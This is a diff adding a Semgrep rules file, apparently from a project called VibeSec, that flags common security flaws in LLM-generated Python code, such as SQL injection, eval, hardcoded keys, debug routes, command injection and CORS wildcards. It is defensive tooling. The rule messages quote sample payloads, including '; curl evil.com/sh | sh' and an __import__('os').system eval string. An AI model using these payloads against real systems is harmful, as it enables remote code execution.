@@ -1,0 +1,375 @@
+# =============================================================================
+# vibe_patterns.yaml -- custom Semgrep rules for LLM-generated code antipatterns
+# =============================================================================
+#
+# WHY THIS FILE EXISTS
+#   Running `--config auto` against test_targets/vulnerable.py caught 4 of the 7
+#   planted vulnerabilities. It found the ones with a dangerous *function call* at
+#   their centre -- eval(), subprocess with shell=True, string-built SQL -- and
+#   missed every vulnerability whose danger lives in context rather than in a
+#   function name:
+#
+#       MISSED: hardcoded secrets       (API_KEY = "sk-...")
+#       MISSED: unauthenticated debug endpoint that dumps os.environ
+#       MISSED: CORS wildcard with credentials enabled
+#       MISSED: mass assignment / missing authorization in update_profile
+#
+#   That gap is the entire premise of VibeSec. Semgrep's default registry is tuned
+#   for code written by humans who at least knew the rules existed. LLM-generated
+#   code fails differently: it is usually syntactically careful and contextually
+#   naive. These rules target that second failure mode.
+#
+# HOW TO RUN THEM
+#     python scanner.py test_targets/vulnerable.py rules/vibe_patterns.yaml
+#   or directly:
+#     semgrep --config rules/vibe_patterns.yaml --json test_targets/vulnerable.py
+#
+#   Custom rules REPLACE the default ruleset when you pass them as the only config.
+#   To run both at once, pass --config twice:
+#     semgrep --config auto --config rules/vibe_patterns.yaml <target>
+#
+# A NOTE ON SEVERITY
+#   Semgrep only has three levels: ERROR, WARNING, INFO. That's coarser than the
+#   critical/high/medium/low scale in VibeSec's report, and deliberately so -- the
+#   finer grading is the explainer's job, because severity depends on whether the
+#   input is actually attacker-reachable, and that's a judgement call about the
+#   application, not a property of the syntax.
+# =============================================================================
+
+rules:
+
+  # ===========================================================================
+  # RULE 1 -- SQL built by string formatting
+  # ===========================================================================
+  # WHAT IT CATCHES
+  #   Any SQL query assembled with an f-string, .format(), %-formatting, or +
+  #   concatenation, then handed to a database driver.
+  #
+  # WHY LLMs GENERATE THIS
+  #   f-strings are the idiomatic modern way to build a string in Python, and the
+  #   model applies that idiom uniformly across every string it writes. It has no
+  #   concept that this one category of string gets parsed as a language by
+  #   something downstream.
+  #
+  # WHY WE CATCH IT SEPARATELY FROM --config auto
+  #   The registry rule does find the direct `cursor.execute(f"...")` shape. This
+  #   one also catches the two-step version -- build the query into a variable on
+  #   one line, execute it on another -- which is how LLMs usually format it,
+  #   because it reads more cleanly.
+  - id: vibe-sql-string-building
+    languages: [python]
+    severity: ERROR
+    message: >-
+      SQL query built by string formatting. Any attacker-controlled value in this
+      string is parsed as SQL, not as data -- classic injection. Use a parameterised
+      query instead: cursor.execute("SELECT ... WHERE id = ?", (value,))
+    metadata:
+      category: security
+      cwe: "CWE-89: SQL Injection"
+      vibe-reason: "LLMs default to f-strings for all string building, including SQL."
+    patterns:
+      - pattern-either:
+          # Direct: the formatting happens inside the execute() call.
+          - pattern: $CURSOR.execute(f"...", ...)
+          - pattern: $CURSOR.execute("...".format(...), ...)
+          - pattern: $CURSOR.execute("..." % ..., ...)
+          - pattern: $CURSOR.execute("..." + $X, ...)
+          # Two-step: query is built into a variable, then executed.
+          # The `...` between the two lines means "any number of statements may
+          # appear in between" -- so this still matches when the LLM adds logging
+          # or a comment between building and executing.
+          - pattern: |
+              $QUERY = f"..."
+              ...
+              $CURSOR.execute($QUERY, ...)
+          - pattern: |
+              $QUERY = "...".format(...)
+              ...
+              $CURSOR.execute($QUERY, ...)
+          - pattern: |
+              $QUERY = "..." % ...
+              ...
+              $CURSOR.execute($QUERY, ...)
+
+  # ===========================================================================
+  # RULE 2 -- eval() or exec() on anything that isn't a literal
+  # ===========================================================================
+  # WHAT IT CATCHES
+  #   eval($X) / exec($X) where $X is a variable rather than a hardcoded string.
+  #
+  # WHY THE "NOT A LITERAL" DISTINCTION MATTERS
+  #   eval("2 + 2") is pointless but harmless -- the programmer chose the string.
+  #   eval(user_input) is remote code execution. The pattern-not clauses below
+  #   encode exactly that difference, which is what keeps this rule from screaming
+  #   about every eval() in the codebase. Precision is what makes a rule get used
+  #   instead of disabled.
+  #
+  # WHY LLMs GENERATE THIS
+  #   "Build a calculator endpoint" has a three-line answer using eval() and a
+  #   fifty-line answer that writes an expression parser. Models produce answers
+  #   that fit in a code block.
+  - id: vibe-eval-exec-on-variable
+    languages: [python]
+    severity: ERROR
+    message: >-
+      eval()/exec() called on a variable. If that value can be influenced by a user,
+      this is remote code execution -- an attacker sends
+      __import__('os').system('...') and owns the process. Parse the input with ast
+      and an operator allowlist instead. Note that filtering the string is not a fix;
+      eval sandboxes are routinely escaped.
+    metadata:
+      category: security
+      cwe: "CWE-95: Eval Injection"
+      vibe-reason: "eval() is the shortest working answer to 'evaluate this expression'."
+    patterns:
+      - pattern-either:
+          - pattern: eval($X, ...)
+          - pattern: exec($X, ...)
+      # `"..."` is Semgrep's literal-string wildcard: it matches any string constant.
+      # Excluding it leaves only the cases where the argument is a variable.
+      - pattern-not: eval("...", ...)
+      - pattern-not: exec("...", ...)
+
+  # ===========================================================================
+  # RULE 3 -- Hardcoded credentials
+  # ===========================================================================
+  # WHAT IT CATCHES
+  #   Two shapes: (a) a variable whose NAME looks credential-ish assigned a string
+  #   literal, and (b) any string whose VALUE matches a known key format, regardless
+  #   of what the variable is called.
+  #
+  # WHY BOTH SHAPES
+  #   Name-based matching misses `k = "sk-live-..."`. Value-based matching misses
+  #   `password = "hunter2"`, which has no recognisable format. Neither is complete
+  #   alone, and the union of two mediocre detectors is a decent detector.
+  #
+  # WHY THIS USES metavariable-regex AND NOT pattern-regex
+  #   pattern-regex runs against the raw file text, which includes comments. This
+  #   file's own test fixture has lines like `# API_KEY = os.environ[...]` in its
+  #   explanatory comments, and a raw regex would flag every one of them. Matching
+  #   the AST first and then regexing the captured metavariables means we only ever
+  #   look at real assignments. Worth internalising: matching source text and
+  #   matching code are different things, and the difference is usually false
+  #   positives.
+  #
+  # WHY LLMs GENERATE THIS
+  #   The model is asked for a working example, and a working example needs a key in
+  #   it. `os.environ["API_KEY"]` produces a snippet that crashes on paste, so the
+  #   model inlines a placeholder -- and the developer swaps in the real key without
+  #   moving it out of the file.
+  - id: vibe-hardcoded-secret-by-name
+    languages: [python]
+    severity: ERROR
+    message: >-
+      Credential-looking variable assigned a hardcoded string. Once this is committed
+      it is in Git history permanently -- deleting the line later does not remove it,
+      and keys pushed to public repos are scraped within minutes. Read it from the
+      environment instead, and rotate this value; treat it as already compromised.
+    metadata:
+      category: security
+      cwe: "CWE-798: Use of Hard-coded Credentials"
+      vibe-reason: "A self-contained runnable snippet needs the key inline to work."
+    patterns:
+      - pattern: $NAME = $VALUE
+      - metavariable-regex:
+          metavariable: $NAME
+          # (?i) makes it case-insensitive, so API_KEY / api_key / ApiKey all match.
+          regex: (?i).*(api_?key|secret|password|passwd|pwd|token|credential|auth_?key|access_?key).*
+      - metavariable-regex:
+          metavariable: $VALUE
+          # The captured text includes the surrounding quotes, hence the ["'] anchors.
+          # {6,} skips trivially short values like "" or "x", which are usually
+          # placeholders or test stubs rather than real secrets.
+          regex: ^["'][^"']{6,}["']$
+      # Don't flag the correct pattern: a value pulled from the environment is the fix,
+      # not the bug. Without these exclusions the rule would flag the remediated code
+      # too -- and a rule that fires after you fix the problem trains people to ignore it.
+      - pattern-not: $NAME = os.environ[...]
+      - pattern-not: $NAME = os.environ.get(...)
+      - pattern-not: $NAME = os.getenv(...)
+
+  - id: vibe-hardcoded-secret-by-format
+    languages: [python]
+    severity: ERROR
+    message: >-
+      String literal matches a known credential format (OpenAI/Anthropic key, AWS key,
+      Bearer token, or private key block). Move it to an environment variable and
+      rotate the value.
+    metadata:
+      category: security
+      cwe: "CWE-798: Use of Hard-coded Credentials"
+      vibe-reason: "Models paste realistic-looking example keys that developers then replace with real ones."
+    patterns:
+      - pattern: $NAME = $VALUE
+      - metavariable-regex:
+          metavariable: $VALUE
+          regex: ^["'](sk-[A-Za-z0-9_\-]{8,}|sk_live_[A-Za-z0-9]{8,}|AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{20,}|Bearer\s+[A-Za-z0-9_\-\.]{16,}|-----BEGIN[A-Z ]*PRIVATE KEY-----.*)["']$
+
+  # ===========================================================================
+  # RULE 4 -- Unauthenticated route exposing system state
+  # ===========================================================================
+  # WHAT IT CATCHES
+  #   A Flask or FastAPI route handler with no auth decorator/dependency that reads
+  #   process or filesystem internals -- os.environ, os.listdir, sys.path, globals().
+  #
+  # A DELIBERATE SCOPE DECISION -- READ THIS ONE
+  #   The obvious version of this rule is "flag every route with no auth decorator."
+  #   Don't write that rule. Most routes in most apps are legitimately public, so it
+  #   fires on nearly every handler in the file, and a rule with a 90% false positive
+  #   rate gets switched off within a day. It is worse than no rule, because it also
+  #   buries the true positives.
+  #
+  #   So this narrows to routes that both lack auth AND touch something sensitive.
+  #   That trade is real and it costs coverage: an unauthenticated /delete_all_users
+  #   will NOT be caught here, because deleting users doesn't match any of the
+  #   sensitive-read patterns below. That's a known limitation, and it's the honest
+  #   version of the "FastAPI routes with no auth" rule from the spec -- worth writing
+  #   up in the Step 6 notes rather than pretending the rule is complete.
+  #
+  # WHY LLMs GENERATE THIS
+  #   The debug endpoint is genuinely useful during development and the model was
+  #   asked to make the app debuggable. Nothing in the generated code marks it as
+  #   development-only, so it ships untouched.
+  - id: vibe-unauthenticated-debug-route
+    languages: [python]
+    severity: ERROR
+    message: >-
+      Route handler with no authentication that exposes process or filesystem
+      internals. os.environ leaks every secret the process holds; directory and path
+      listings hand an attacker a map of the deployment. "Nobody knows the URL" is not
+      a control -- /debug and /admin are in every scanner wordlist. Delete it, or gate
+      it behind both an auth check and an environment check.
+    metadata:
+      category: security
+      cwe: "CWE-200: Exposure of Sensitive Information"
+      vibe-reason: "Models add debug endpoints when asked for debuggability, with no prod/dev gate."
+    patterns:
+      # STRUCTURE OF THIS RULE -- worth understanding, it's the most useful Semgrep
+      # idiom in this file. `pattern-inside` sets a *scope* ("we are somewhere within
+      # a route handler") and the plain `pattern` clauses then match the actual thing
+      # we care about within that scope. The finding gets reported at the sensitive
+      # expression rather than at the decorator, which points you at the real leak.
+      #
+      # An earlier draft tried to express the whole thing as one multi-line pattern
+      # with `$X = ... os.environ ...` in the body. Semgrep rejected it: `...` is a
+      # statement/argument wildcard, not a free-floating "any expression around this"
+      # operator, so that line isn't valid pattern syntax. Splitting scope from match
+      # is the correct way to say it.
+      - pattern-inside: |
+          @$APP.$METHOD(...)
+          def $FUNC(...):
+              ...
+      # The handler must touch something sensitive for this to fire -- see the scope
+      # note above the rule for why we don't flag every unauthenticated route.
+      - pattern-either:
+          - pattern: os.environ
+          - pattern: os.listdir(...)
+          - pattern: os.getcwd()
+          - pattern: sys.path
+          - pattern: os.sys.path
+          - pattern: globals()
+          - pattern: locals()
+      # Exclusions: if an auth-ish decorator is stacked on the route, assume the
+      # developer thought about access control and stay quiet. $AUTH matches any
+      # single extra decorator, which is imprecise -- @app.route + @cache would
+      # silence this too. Tightening it would mean hardcoding a list of known auth
+      # decorator names, which breaks on every custom one. Erring toward silence is
+      # the right call for a rule meant to be left switched on.
+      - pattern-not-inside: |
+          @$APP.$METHOD(...)
+          @$AUTH
+          def $FUNC(...):
+              ...
+      - pattern-not-inside: |
+          @$AUTH
+          @$APP.$METHOD(...)
+          def $FUNC(...):
+              ...
+
+  # ===========================================================================
+  # RULE 5 -- Command injection
+  # ===========================================================================
+  # WHAT IT CATCHES
+  #   os.system() / subprocess.* called with a variable, or with shell=True and a
+  #   non-literal command.
+  #
+  # THE KEY INSIGHT
+  #   shell=True is the whole problem. It means the string gets parsed by the system
+  #   shell before running, and the shell treats ; | & $() ` as syntax rather than
+  #   text. Pass a LIST with shell=False and there is no shell to inject into -- a
+  #   semicolon in the hostname stays a literal semicolon in an argument.
+  #
+  # WHY LLMs GENERATE THIS
+  #   shell=True is what lets a subprocess example be one readable line instead of a
+  #   list of argv fragments. It is also exactly what makes it exploitable.
+  - id: vibe-command-injection
+    languages: [python]
+    severity: ERROR
+    message: >-
+      Shell command built from a variable. If any part of it is user-controlled, an
+      attacker appends "; curl evil.com/sh | sh" and runs arbitrary commands as your
+      app's user. Pass a list of arguments and drop shell=True -- with no shell
+      involved there is no shell syntax to inject.
+    metadata:
+      category: security
+      cwe: "CWE-78: OS Command Injection"
+      vibe-reason: "shell=True is what makes a one-line subprocess example work."
+    patterns:
+      - pattern-either:
+          - pattern: os.system($CMD)
+          - pattern: os.popen($CMD)
+          - pattern: subprocess.run($CMD, ..., shell=True, ...)
+          - pattern: subprocess.call($CMD, ..., shell=True, ...)
+          - pattern: subprocess.Popen($CMD, ..., shell=True, ...)
+          - pattern: subprocess.check_output($CMD, ..., shell=True, ...)
+      # A fully hardcoded command has no injection point -- the developer chose every
+      # byte of it. Only flag when something is being interpolated or concatenated in.
+      - pattern-not: os.system("...")
+      - pattern-not: os.popen("...")
+      - pattern-not: subprocess.run("...", ..., shell=True, ...)
+      - pattern-not: subprocess.call("...", ..., shell=True, ...)
+      - pattern-not: subprocess.Popen("...", ..., shell=True, ...)
+      - pattern-not: subprocess.check_output("...", ..., shell=True, ...)
+
+  # ===========================================================================
+  # RULE 6 -- CORS wildcard (bonus rule, beyond the original five)
+  # ===========================================================================
+  # WHAT IT CATCHES
+  #   Access-Control-Allow-Origin set to "*", or a CORS middleware configured with a
+  #   wildcard origin list.
+  #
+  # WHY IT'S IN HERE
+  #   `--config auto` missed this on the test fixture, and it's one of the single most
+  #   common things an LLM produces -- because "my frontend gets a CORS error" has an
+  #   answer that makes the error disappear instantly, and that answer is to turn the
+  #   protection off.
+  #
+  # WHAT'S ACTUALLY BROKEN
+  #   CORS is the browser rule that stops evil.com's JavaScript from reading responses
+  #   from your API using the visiting user's cookies. Wildcard plus credentials
+  #   switches that off: any page the user visits can read their account data.
+  - id: vibe-cors-wildcard
+    languages: [python]
+    severity: WARNING
+    message: >-
+      CORS configured to allow any origin. Combined with credentials, this lets any
+      website the user visits make authenticated requests to this API and read the
+      responses using their session. List the origins you actually serve instead of
+      using "*".
+    metadata:
+      category: security
+      cwe: "CWE-942: Permissive Cross-domain Policy"
+      vibe-reason: "'Allow all origins' is the fastest way to make a CORS error go away."
+    patterns:
+      - pattern-either:
+          - pattern: $RESP.headers["Access-Control-Allow-Origin"] = "*"
+          - pattern: $RESP.headers.add("Access-Control-Allow-Origin", "*")
+          - pattern: CORS($APP, ..., origins="*", ...)
+          - pattern: CORS($APP, ..., origins=["*"], ...)
+          - pattern: $APP.add_middleware(..., allow_origins=["*"], ...)
+          - pattern: CORSMiddleware(..., allow_origins=["*"], ...)
+          # This one MUST be quoted. Unquoted, YAML reads the leading `{` as the start
+          # of a flow mapping and parses `...` as a key with a null value, which
+          # Semgrep rejects with "null values prohibited". Quoting keeps it a plain
+          # string that Semgrep parses as a Python dict pattern, which is what we want.
+          - pattern: '{..., "allow_origins": ["*"], ...}'
